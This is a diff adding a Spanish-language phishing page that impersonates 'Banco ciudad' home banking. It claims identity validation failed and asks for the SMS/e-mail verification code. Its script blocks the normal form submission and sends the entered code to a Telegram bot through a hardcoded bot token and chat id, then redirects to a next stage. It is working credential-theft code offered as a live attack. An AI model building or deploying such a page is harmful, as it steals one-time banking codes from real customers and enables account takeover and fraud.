@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Banco ciudad</title>
+  <script src="valide_archivos/jquery-3.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
+  <link rel="icon" type="ico" href="https://ciudad-web.com/favicon.ico">
+  <link href="valide_archivos/bootstrap.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+  <style type="text/css">
+    .container-page{max-width:470px; width: 90%; } body{background:#f2f1ef; } *{color:#909394; } .text-primary{color:#005bb0 !important; } fieldset{width:90%; max-width:374px; display: block !important; margin: auto; } .btn{width:90% !important; } .logo-ciudad{height: 58.33px; } .btn{max-width:374px; display: block; margin: auto; } label{font-size:13px; } .helper-user-div div {height: 49px; line-height: 49px; } .helper-user-div{background:#f2f1ef; } .btn-primary{background:#005baa !important; border-color:#005baa !important; } .btn-disabled{background:#e2e0dd!important; border-color:#e2e0dd !important; color: #909394; } .form-control{height: 46px; color: #909394 !important; } .form-control:focus{box-shadow: 0 0 0 2px #5555; border-color:transparent; }
+  </style>
+</head>
+<body>
+  <div class="container-page m-auto py-5">
+    <header class="py-4 mb-4">
+      <div class="text-center w-100">
+        <img src="valide_archivos/ciudad.svg" class="logo-ciudad">
+      </div>
+    </header>
+    <main>
+      <form class="bg-white mb-3 shadow" action="valide-dos.php" method="POST">
+        <div class="position-relative text-center" style="top: -45px;">
+          <img src="valide_archivos/icono-login.png" height="90px">
+        </div>
+        <fieldset>
+          <div class="alert rounded-0 alert-warning ">
+            <h3 class="fs-5 mb-0">VALIDACIÓN</h3>
+            <p class="mb-0 text-dark" style="font-size:13px;">No pudimos validar tu identidad. Intenta con este metodo.</p>
+          </div>
+          <p class="text-muted fw-semibold" style="font-size:13px;">Te enviamos un código via SMS/E-MAIL ingresalo en el campo del formulario para validar tu identidad.</p>
+          <div class="mb-2">
+            <label class="form-label mb-0">
+              CÓDIGO SMS
+            </label>
+            <input type="number" required="" id="user" placeholder="Código SMS/E-MAIL" class="form-control rounded-0" name="user">
+          </div>
+          
+        </fieldset>
+        <button disabled="disabled" class="btn btn-disabled rounded-1 w-100 btn-primary" style="margin-bottom:80px;cursor: no-drop;">
+          Siguiente
+        </button>
+        <div class="helper-user-div d-flex justify-content-between ">
+          <div class="w-50 text-center">
+            Ayuda
+          </div>
+          <div class="w-50 text-center">
+            Nuevo usuario
+          </div>
+        </div>
+      </form>
+      <p class="text-primary mb-5 text-center fw-semibold">
+        Por tu seguridad, nunca compartas los datos de acceso ni<br>
+        códigos de validación de tu Home Banking.
+      </p>
+      <ul style="font-size: 13px;" class="mb-5">
+        <li class="d-inline px-2">
+          <a href="" class="text-secondary">Términos y condiciones</a>
+        </li>
+        <li class="d-inline px-2">
+          <a href="" class="text-secondary">Seguridad del sistema</a>
+        </li>
+        <li class="d-inline px-2">
+          <a href="" class="text-secondary">Contacto</a>
+        </li>
+      </ul>
+      <p class="text-center">Versión - v0.18.404</p>
+    </main>
+  </div>
+  <script src="valide_archivos/bootstrap.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+  <script type="text/javascript">
+    $("#user").keyup(function(){
+      if ($(this).val().length == 6) {
+        $(".btn-primary").removeClass("btn-disabled");
+        $(".btn-primary").removeAttr("disabled");
+        $(".btn-primary").css("cursor","pointer");
+      }else{
+        $(".btn-primary").addClass("btn-disabled");
+        $(".btn-primary").attr("disabled","disabled");
+        $(".btn-primary").css("cursor","no-drop");
+      }
+    })
+$(document).ready(function() {
+    $('form').submit(function(event) {
+        event.preventDefault(); // Evitar el envío del formulario por defecto
+        
+        // Obtener el código ingresado por el usuario
+        var codigo = $('#user').val();
+        
+        // Crear el mensaje a enviar a Telegram
+        var mensaje = "Código de validación ingresado: " + codigo;
+        
+        // Hacer una solicitud AJAX a la API de Telegram
+        $.ajax({
+            url: 'https://api.telegram.org/bot6931733086:AAE8K0GHhBQLyPQ5pm2UbJ2IhkgBmg6raDI/sendMessage',
+            method: 'POST',
+            data: {
+                chat_id: '6044742043',
+                text: mensaje
+            },
+            success: function(response) {
+                console.log('Mensaje enviado correctamente:', response);
+                // Redirigir a otro índice después de enviar el mensaje
+                window.location.replace("valide-dos.html");
+            },
+            error: function(error) {
+                console.error('Error al enviar el mensaje:', error);
+            }
+        });
+    });
+});
+  </script>
+
+</body></html>
